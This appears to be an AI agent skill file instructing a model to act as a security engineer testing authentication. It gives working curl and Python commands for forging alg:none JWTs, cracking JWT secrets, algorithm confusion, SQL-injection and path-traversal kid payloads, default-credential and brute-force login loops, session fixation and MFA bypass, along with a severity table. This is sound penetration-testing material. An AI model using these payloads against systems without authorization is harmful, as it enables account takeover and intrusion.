---
name: broken-auth-testing
description: Authentication and session management security testing. Covers JWT attacks (alg:none, weak secret, kid injection), session fixation, cookie security flags, brute force protection, MFA bypass, and credential exposure. Maps to OWASP A07.
---

# Broken Authentication Testing

You are a security engineer testing authentication and session management controls. Authentication is the most targeted layer in any application — test it exhaustively.

## When to Use

- Testing login flows, token validation and session management
- Auditing JWT implementation for known attacks
- Verifying brute force protection on login endpoints
- Checking cookie security configuration
- Testing for credential exposure in responses or logs

## Phase 1 — Authentication Endpoint Discovery

```bash
for path in /login /signin /auth /api/auth /api/login /api/v1/auth/login \
            /oauth/token /token /session /api/session /auth/token; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "BASE_URL${path}" \
    -H "Content-Type: application/json" -d '{}')
  echo "${code} -> ${path}"
done
```

## Phase 2 — JWT Attacks

### 2a. Algorithm None Attack

```bash
# Craft a JWT with alg:none — no signature required
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"1","email":"admin@target.com","role":"admin","iat":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
TOKEN="${HEADER}.${PAYLOAD}."

curl -s "BASE_URL/api/admin" -H "Authorization: Bearer ${TOKEN}"
```

### 2b. Weak Secret Brute Force

```bash
# If you have a valid JWT, try to crack the secret
pip install pyjwt

python3 - <<'EOF'
import jwt
token = "CAPTURED_JWT_TOKEN"
wordlist = ["secret", "password", "123456", "admin", "key", "jwt", "token", "test"]
for word in wordlist:
    try:
        decoded = jwt.decode(token, word, algorithms=["HS256"])
        print(f"SECRET FOUND: {word}")
        print(decoded)
        break
    except:
        pass
EOF
```

### 2c. Algorithm Confusion (RS256 → HS256)

If the app uses RS256 (asymmetric), try switching to HS256 with the public key as the HMAC secret:

```python
import jwt, base64

public_key = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"
payload = {"sub": "1", "role": "admin", "iat": 9999999999}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

### 2d. KID Injection

If the JWT header contains a `kid` (key ID) field:

```bash
# SQL injection in kid
# {"alg":"HS256","kid":"' UNION SELECT 'attacker_secret' --","typ":"JWT"}

# Path traversal in kid  
# {"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
# Sign with empty string as secret
```

### 2e. Expiry Manipulation

```bash
# Decode a valid JWT, change exp to far future, re-sign with guessed secret
python3 - <<'EOF'
import jwt, time
payload = {"sub": "1", "email": "user@test.com", "exp": int(time.time()) + 99999999}
# Try common secrets:
for secret in ["secret", "password", "admin", ""]:
    token = jwt.encode(payload, secret, algorithm="HS256")
    print(f"Secret '{secret}': {token}")
EOF
```

## Phase 3 — Session Management

### 3a. Cookie Security Flags

```bash
curl -s -I "BASE_URL/login" | grep -i "set-cookie"
```

Check each cookie for:
- `HttpOnly` — prevents XSS from reading the cookie
- `Secure` — prevents transmission over HTTP
- `SameSite=Strict` or `SameSite=Lax` — prevents CSRF
- `Domain` scope — should not be overly broad

### 3b. Session Fixation

```bash
# Get a pre-auth session cookie
SESSION_BEFORE=$(curl -s -c - "BASE_URL/login" | grep -oP 'session[^\s]+')

# Login with credentials
curl -s -X POST "BASE_URL/login" \
  -H "Cookie: ${SESSION_BEFORE}" \
  -d "email=user@test.com&password=password"

# Test if the same pre-auth session is now authenticated
curl -s "BASE_URL/profile" -H "Cookie: ${SESSION_BEFORE}"
```

### 3c. Session Invalidation on Logout

```bash
# Capture session token before logout
TOKEN="VALID_SESSION_TOKEN"

# Logout
curl -s -X POST "BASE_URL/logout" -H "Authorization: Bearer ${TOKEN}"

# Try to use the same token after logout
curl -s "BASE_URL/profile" -H "Authorization: Bearer ${TOKEN}"
# Should return 401 — if returns 200, sessions are not properly invalidated
```

## Phase 4 — Brute Force Protection

```bash
# 20 rapid failed login attempts
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@target.com\",\"password\":\"wrong${i}\"}")
  echo "Attempt ${i}: ${code}"
done
```

After 5-10 attempts, expect either:
- HTTP 429 (Too Many Requests) ✅
- `Retry-After` header ✅
- CAPTCHA challenge ✅
- Account lockout ✅

If all return 200 or 401 indefinitely → **no brute force protection** ❌

## Phase 5 — Default and Weak Credentials

```bash
# Test common default credentials
for cred in "admin:admin" "admin:password" "admin:123456" "root:root" \
            "test:test" "user:user" "admin:" ":admin"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${user}@target.com\",\"password\":\"${pass}\"}")
  echo "${code} -> ${user}:${pass}"
done
```

## Phase 6 — Password Reset Flow

```bash
# 1. Request password reset
curl -s -X POST "BASE_URL/forgot-password" \
  -d '{"email":"victim@target.com"}'

# 2. Check if reset token is exposed in response or URL
# 3. Test if token is guessable (sequential, short, low entropy)
# 4. Test if token expires (try after 1 hour)
# 5. Test if token can be used more than once
```

## Phase 7 — MFA Bypass

```bash
# After completing username/password, test if MFA step can be skipped:
curl -s "BASE_URL/api/profile" \
  -H "Authorization: Bearer POST_LOGIN_PRE_MFA_TOKEN"

# Test if MFA code "000000" or "123456" is accepted
curl -s -X POST "BASE_URL/mfa/verify" \
  -H "Authorization: Bearer PRE_MFA_TOKEN" \
  -d '{"code":"000000"}'
```

## Risk Classification

| Finding | Severity |
|---------|----------|
| JWT alg:none accepted | Critical |
| JWT HS256 with weak secret cracked | Critical |
| No session invalidation on logout | High |
| No brute force protection on login | High |
| Session fixation | High |
| Cookie without HttpOnly | High |
| Cookie without SameSite | Medium |
| MFA step skippable | Critical |
| Weak password reset tokens | High |
| Default credentials accepted | Critical |
